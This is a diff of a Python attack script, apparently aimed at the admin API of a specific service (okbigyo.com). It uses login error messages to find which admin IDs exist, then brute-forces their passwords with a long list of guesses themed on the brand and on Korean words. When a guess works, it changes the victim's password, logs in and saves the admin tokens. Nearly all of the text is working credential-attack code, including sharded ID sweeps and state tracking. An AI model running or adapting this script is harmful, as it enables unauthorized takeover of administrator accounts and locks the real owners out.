@@ -1,20 +1,25 @@
 #!/usr/bin/env python3
-"""Two-namespace admin oracle.
+"""Two-namespace admin oracle (v2).
 
-Discovery: /admin-api/auth/login and /admin-api/auth/password use DIFFERENT
-ID pools. login: "등록되지 않은 사번 입니다."; password-change: same phrase for
-ghosts, "비밀번호가 일치하지 않습니다." for real ones (dongmin, admin confirmed
-REAL in the password namespace).
+Namespaces:
+  PWD_URL   /admin-api/auth/password  — change-old-password semantics.
+            ghost id -> "등록되지 않은 사번 입니다."
+            real id  -> "비밀번호가 일치하지 않습니다."  (appears lockout-free)
+  LOGIN_URL /admin-api/auth/login     — different ID pool entirely; all 86
+            username-style candidates were ghosts there (run-2 audit).
+            Hypothesis: login uses numeric 사번 or email-style ids.
 
-Phase A: sweep CANDIDATES against the password endpoint (dummy old-password)
-        -> real_ids.json (existence oracle, appears lockout-free).
-Phase B: for real ids, grind the 95-pwd list AS THE OLD PASSWORD on the
-        password endpoint. On success the old pwd is known -> log in via
-        /auth/login to mint admin_token.json.
-Phase C: bridge — try real ids on the LOGIN endpoint with the same list
-        (they may exist in both namespaces).
-Sharded like admin_cracker (ADMIN_SHARDS/ADMIN_SHARD).
+Phases (each sharded via ADMIN_SHARDS/ADMIN_SHARD, deterministic partitions):
+  A: existence sweep of CANDIDATES on PWD_URL        -> real_ids.json
+  B: old-password grind for real ids (PARTITIONED)   -> old pwd -> flip -> login
+  D: login-namespace enum: numeric 1..400 + emails   -> login_real_ids.json
+  E: login-grind for real login ids (budget 12/id)   -> admin_token.json
+  C: legacy bridge real ids onto LOGIN top-12
+
+State: oracle_state_{i}.json per shard. Crack progress migrates as
+max(pwd_idx) across all shard files so repartitions never repeat work.
 """
+import glob
 import json
 import os
 import ssl
@@ -30,7 +35,11 @@ CTX.check_hostname = False
 CTX.verify_mode = ssl.CERT_NONE
 DELAY = float(os.environ.get("ORACLE_DELAY", "0.5"))
 PHASE_A_CAP = int(os.environ.get("ORACLE_ENUM_CAP", "120"))
-PHASE_B_CAP = int(os.environ.get("ORACLE_CRACK_CAP", "200"))
+PHASE_B_CAP = int(os.environ.get("ORACLE_CRACK_CAP", "1200"))
+PHASE_D_CAP = int(os.environ.get("ORACLE_LOGIN_ENUM_CAP", "450"))
+PHASE_E_CAP = int(os.environ.get("ORACLE_LOGIN_GRIND_CAP", "60"))
+NUM_RANGE = int(os.environ.get("ORACLE_NUM_MAX", "400"))
+EMAIL_DOMAINS = ["okbigyo.com"]
 
 CANDIDATES = [
     # spec-leaked + confirmed-real
@@ -67,7 +76,9 @@ CANDIDATES = [
     "leader", "user", "member", "maintainer", "tester", "qa",
 ]
 
-PASSWORDS = [
+# NOTE: first 94 entries are FIXED ORDER — per-id pwd_idx state indexes into
+# this list. Append-only extensions below (de-duplicated against the base).
+_BASE_PASSWORDS = [
     "admin1234", "admin123!", "admin1234!", "Admin1234!", "admin!1234",
     "okbigyo1234", "Okbigyo1234!", "okbigyo!", "okbigyo123",
     "bigyo1234", "Bigyo1234!", "bigyo!", "bigyo123",
@@ -90,6 +101,57 @@ PASSWORDS = [
     "Welcome123!", "Springboot1!", "Oracle1234!", "java1234!",
     "1234!qaws", "!qaws1234", "qaws1234!", "asdf1234!",
 ]
+
+_TIER3 = [
+    # keyboard / classic
+    "qwer1234!", "qwerty!", "1q2w3e4r5t", "zaq12wsx", "zxcv1234",
+    "poiuyt1234", "abcdef1234", "abcd1234!", "Abc1234!", "Abc!1234",
+    "aaaa1234", "1111122222", "12341234!", "12121212", "22222222",
+    "33333333", "1231231234", "1234512345", "5432154321", "11223344",
+    "1122334455", "654321", "654321!", "852456", "258369", "147258369",
+    "159357", "741852963", "01012345678",
+    # brand / company
+    "okbigyo123456789", "okbigyo@1234", "okbigyo!@#$", "okbigyo2026!",
+    "okbigyo2025!", "okbigyo2024!", "okbigyo1!", "okbigyo!2026",
+    "bigyo123456789", "bigyo!@#", "bigyo@1234", "bigyo2024", "bigyo2025",
+    "coocon123456789", "coocon!@#", "okbank123456789", "okbank2024!",
+    "okloan1234!", "okcredit1234!", "okmoney1234!", "oksave1234!",
+    "okinvent1234!", "okfund1234!", "okasset1234!", "okcapital1234!",
+    # years / dates
+    "2024!!", "2025!!", "2026!!", "1234!!", "20240101!", "20250101!",
+    "20260101!", "20241231", "20251231", "20261231", "01012024",
+    "01012025", "01012026", "newyear2026!", "happy2026!", "chuseok2025!",
+    # personal / korean
+    "sarang1234!", "saranghae1234!", "iloveyou1234!", "love1234!",
+    "family1234!", "baby1234!", "dream1234!", "hope1234!", "life1234!",
+    "health1234!", "bank1234!", "apple1234!", "banana1234!", "orange1234!",
+    "melon1234!", "peach1234!", "soccer1234!", "basketball1234!",
+    "baseball1234!", "coffee1234!", "tea1234!", "beer1234!", "wine1234!",
+    "cake1234!", "chocolate1234!", "pizza1234!", "burger1234!", "ramen1234!",
+    "bibimbap1234!", "samgyeopsal1234!", "summer1234!", "winter1234!",
+    "autumn1234!", "rainbow1234!", "star1234!", "moon1234!", "sunshine1234!",
+    # tech / role
+    "changeme1234!", "init1234!", "welcome1234!", "secret1234!",
+    "pass1234!", "passwd1234!", "password1234!", "p@ssw0rd1234", "P@ss1234",
+    "root1234!", "toor1234", "admin@123", "admin!123", "admin123",
+    "Administrator123!", "SuperAdmin123!", "superadmin1234!",
+    "Manager1234!", "Operator1234!", "Developer1234!", "developer1234!",
+    "engineer1234!", "Tester1234!", "Demo1234!", "Guest1234!", "Staff1234!",
+    "Partner1234!", "Finance1234!", "Cs1234!", "Support1234!", "Care1234!",
+]
+
+
+def _build_passwords():
+    seen = set()
+    out = []
+    for p in _BASE_PASSWORDS + _TIER3:
+        if p not in seen:
+            seen.add(p)
+            out.append(p)
+    return out
+
+
+PASSWORDS = _build_passwords()
 
 
 def post(url, payload):
@@ -123,15 +185,40 @@ def jsave(name, obj):
     json.dump(obj, open(os.path.join(HERE, name), "w"), ensure_ascii=False, indent=1)
 
 
+def best_pwd_idx(shard_total, shard_idx, rid, key="crack"):
+    """Adopt max pwd_idx across all shard state files (migration safety)."""
+    best = 0
+    pat = os.path.join(HERE, "oracle_state_*.json") if shard_total > 1 else os.path.join(HERE, "oracle_state.json")
+    for fp in glob.glob(pat):
+        try:
+            d = json.load(open(fp))
+        except Exception:
+            continue
+        rec = d.get(key, {}).get(rid)
+        if isinstance(rec, dict):
+            best = max(best, int(rec.get("pwd_idx", 0)))
+    return best
+
+
+def save_admin_token(rid, pwd, lbody):
+    cred = {"adminId": rid, "password": pwd, "raw": lbody[:2000], "ts": int(time.time())}
+    tok = jload("admin_token.json")
+    if not isinstance(tok, list):
+        tok = [tok] if tok else []
+    tok.append(cred)
+    jsave("admin_token.json", tok)
+    log("*** admin_token.json WRITTEN")
+
+
 def main():
-    SHARD_TOTAL = int(os.environ.get("ADMIN_SHARDS", "1"))
-    SHARD_IDX = int(os.environ.get("ADMIN_SHARD", "0"))
-    SF = f"oracle_state_{SHARD_IDX}.json" if SHARD_TOTAL > 1 else "oracle_state.json"
+    STOT = int(os.environ.get("ADMIN_SHARDS", "1"))
+    SIDX = int(os.environ.get("ADMIN_SHARD", "0"))
+    SF = f"oracle_state_{SIDX}.json" if STOT > 1 else "oracle_state.json"
     st = jload(SF)
     real = jload("real_ids.json")
-    my_cands = [c for i, c in enumerate(CANDIDATES) if i % SHARD_TOTAL == SHARD_IDX]
-    if SHARD_TOTAL > 1:
-        log(f"ORACLE SHARD {SHARD_IDX}/{SHARD_TOTAL}: {len(my_cands)} candidates")
+    lreal = jload("login_real_ids.json")
+    my_cands = [c for i, c in enumerate(CANDIDATES) if i % STOT == SIDX]
+    log(f"ORACLE SHARD {SIDX}/{STOT}: {len(my_cands)} cands, {len(real)} real, {len(lreal)} login-real, {len(PASSWORDS)} pwds")
 
     # ---- Phase A: existence sweep on password endpoint
     spent_a = 0
@@ -155,36 +242,29 @@ def main():
         jsave("real_ids.json", real)
         time.sleep(DELAY)
 
-    # ---- Phase B: old-password grind on password endpoint for real ids
+    # ---- Phase B: old-password grind, PARTITIONED over sorted real ids
+    my_rids = [r for i, r in enumerate(sorted(real.keys())) if i % STOT == SIDX]
     spent_b = 0
-    for rid, meta in list(real.items()):
-        rec = st.setdefault("crack", {}).setdefault(rid, {"pwd_idx": 0})
-        idx = rec["pwd_idx"]
+    for rid in my_rids:
+        rec = st.setdefault("crack", {})
+        if rid not in rec:
+            rec[rid] = {"pwd_idx": best_pwd_idx(STOT, SIDX, rid, "crack")}
+        idx = rec[rid]["pwd_idx"]
         while idx < len(PASSWORDS) and spent_b < PHASE_B_CAP:
             pwd = PASSWORDS[idx]
             idx += 1
             spent_b += 1
-            rec["pwd_idx"] = idx
+            rec[rid]["pwd_idx"] = idx
             _, body = post(PWD_URL, {"adminId": rid, "name": "테스트", "birthday": "19900101",
                                      "password": pwd, "newPassword": "Flip!2026x"})
             jsave(SF, st)
             if '"result":"SUCCESS"' in body or '"result": "SUCCESS"' in body or '"success":true' in body:
                 log(f"★★★ OLD PASSWORD FOUND: {rid} = {pwd} :: {body[:200]}")
-                # flip already submitted; try login with BOTH old and new
                 for lp in (pwd, "Flip!2026x"):
                     lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": lp})
                     log(f"LOGIN {rid}/{lp}: http={lst} {lbody[:200]}")
                     if '"token"' in lbody:
-                        cred = {"adminId": rid, "password": lp, "raw": lbody[:2000],
-                                "ts": int(time.time())}
-                        tok = jload("admin_token.json")
-                        if isinstance(tok, list):
-                            tok.append(cred)
-                        else:
-                            tok = [tok] if tok else []
-                            tok.append(cred)
-                        jsave("admin_token.json", tok)
-                        log("*** admin_token.json WRITTEN")
+                        save_admin_token(rid, lp, lbody)
                         break
                 break
             log(f"B {rid} #{idx} {pwd}: {body[:100]}")
@@ -193,27 +273,107 @@ def main():
             log(f"PHASE_B_CAP {PHASE_B_CAP} reached")
             break
 
-    # ---- Phase C: bridge real ids to login endpoint (top-12)
+    # ---- Phase B2: per-id derived candidates (template-account initials)
+    def derived(rid):
+        cap = rid.capitalize()
+        return [rid, cap, rid.upper(),
+                rid + "1234", cap + "1234", rid + "!1234", cap + "!1234",
+                rid + "2024", rid + "2025", rid + "2026",
+                rid + "@1234", rid + "_1234", rid + "123", rid + "!"]
+
+    spent_b2 = 0
+    for rid in my_rids:
+        rec = st.setdefault("derive", {})
+        if rid not in rec:
+            rec[rid] = {"idx": 0}
+        idx = rec[rid]["idx"]
+        while idx < 14 and spent_b2 < int(os.environ.get("ORACLE_DERIVE_CAP", "500")):
+            cand = derived(rid)[idx]
+            idx += 1
+            spent_b2 += 1
+            rec[rid]["idx"] = idx
+            _, body = post(PWD_URL, {"adminId": rid, "name": "테스트", "birthday": "19900101",
+                                     "password": cand, "newPassword": "Flip!2026x"})
+            jsave(SF, st)
+            if '"result":"SUCCESS"' in body or '"result": "SUCCESS"' in body or '"success":true' in body:
+                log(f"★★★ DERIVED OLD PASSWORD FOUND: {rid} = {cand} :: {body[:200]}")
+                for lp in (cand, "Flip!2026x"):
+                    lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": lp})
+                    log(f"LOGIN {rid}/{lp}: http={lst} {lbody[:200]}")
+                    if '"token"' in lbody:
+                        save_admin_token(rid, lp, lbody)
+                        break
+                break
+            log(f"B2 {rid} #{idx} {cand}: {body[:100]}")
+            time.sleep(DELAY)
+        if spent_b2 >= int(os.environ.get("ORACLE_DERIVE_CAP", "500")):
+            break
+
+    # ---- Phase D: login-namespace enum (numeric 사번 + email forms)
+    nums = [str(n) for n in range(1, NUM_RANGE + 1)]
+    my_nums = [n for i, n in enumerate(nums) if i % STOT == SIDX]
+    emails = [(rid, f"{rid}@{dom}") for rid in sorted(real.keys()) for dom in EMAIL_DOMAINS]
+    my_emails = [e for i, e in enumerate(emails) if i % STOT == SIDX]
+    spent_d = 0
+    for lid in my_nums + [e[1] for e in my_emails]:
+        if lid in st.get("login_enum", {}):
+            continue
+        if spent_d >= PHASE_D_CAP:
+            log(f"PHASE_D_CAP {PHASE_D_CAP} reached")
+            break
+        _, body = post(LOGIN_URL, {"adminId": lid, "password": "Probe!1234"})
+        spent_d += 1
+        is_real = "일치하지" in body
+        st.setdefault("login_enum", {})[lid] = "real" if is_real else "ghost"
+        if is_real:
+            lreal[lid] = {"ts": int(time.time()), "kind": "numeric" if lid.isdigit() else "email"}
+            log(f"★★ LOGIN-NAMESPACE REAL ID: {lid} :: {body[:120]}")
+            jsave("login_real_ids.json", lreal)
+        jsave(SF, st)
+        time.sleep(float(os.environ.get("ORACLE_LOGIN_DELAY", "0.4")))
+
+    # ---- Phase E: grind discovered login-ns ids (budget 12/id, lockout-caution)
+    my_lrids = [r for i, r in enumerate(sorted(lreal.keys())) if i % STOT == SIDX]
+    spent_e = 0
+    for rid in my_lrids:
+        rec = st.setdefault("lg_crack", {})
+        if rid not in rec:
+            rec[rid] = {"pwd_idx": best_pwd_idx(STOT, SIDX, rid, "lg_crack")}
+        idx = rec[rid]["pwd_idx"]
+        while idx < 12 and spent_e < PHASE_E_CAP:
+            pwd = PASSWORDS[idx]
+            idx += 1
+            spent_e += 1
+            rec[rid]["pwd_idx"] = idx
+            lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": pwd})
+            jsave(SF, st)
+            if '"token"' in lbody:
+                log(f"★★★ LOGIN GRIND CRACKED: {rid} = {pwd}")
+                save_admin_token(rid, pwd, lbody)
+                break
+            log(f"E {rid} #{idx} {pwd}: http={lst} {lbody[:100]}")
+            time.sleep(DELAY)
+        if spent_e >= PHASE_E_CAP:
+            log(f"PHASE_E_CAP {PHASE_E_CAP} reached")
+            break
+
+    # ---- Phase C: legacy bridge real ids onto LOGIN (top-12, partitioned)
     spent_c = 0
-    for rid in real:
-        rec = st.setdefault("bridge", {}).setdefault(rid, {"pwd_idx": 0})
-        idx = rec["pwd_idx"]
+    for rid in my_rids:
+        rec = st.setdefault("bridge", {})
+        if rid not in rec:
+            rec[rid] = {"pwd_idx": best_pwd_idx(STOT, SIDX, rid, "bridge")}
+        idx = rec[rid]["pwd_idx"]
         while idx < 12 and spent_c < 40:
             pwd = PASSWORDS[idx]
             idx += 1
             spent_c += 1
-            rec["pwd_idx"] = idx
+            rec[rid]["pwd_idx"] = idx
             lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": pwd})
             jsave(SF, st)
             if '"token"' in lbody:
                 log(f"★★★ BRIDGE LOGIN CRACKED: {rid} = {pwd}")
-                cred = {"adminId": rid, "password": pwd, "raw": lbody[:2000],
-                        "ts": int(time.time())}
-                tok = jload("admin_token.json")
-                if not isinstance(tok, list):
-                    tok = [tok] if tok else []
-                tok.append(cred)
-                jsave("admin_token.json", tok)
+                save_admin_token(rid, pwd, lbody)
                 break
             log(f"C {rid} #{idx} {pwd}: http={lst} {lbody[:100]}")
             time.sleep(DELAY)
